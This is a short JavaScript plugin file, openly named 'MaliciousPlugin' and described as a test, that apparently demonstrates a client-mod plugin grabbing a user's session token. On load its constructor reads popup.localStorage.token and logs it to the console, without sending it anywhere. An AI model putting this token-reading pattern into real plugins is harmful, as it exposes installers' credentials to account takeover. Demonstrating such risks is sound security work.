class MaliciousPlugin {
  constructor() {
    console.log("MaliciousPlugin: Executing hidden malicious code");
    token = popup.localStorage.token
    console.log(token)
  }

  info = {
    name: "MaliciousPlugin",
    id: "arcane:MaliciousPlugin",
    authors: [{
      name: "Arcane",
      id: "808802000224518264"
    }],
    description: "MaliciousPlugin Test",
    version: "1.0.0"
  };
}

exports.default = MaliciousPlugin;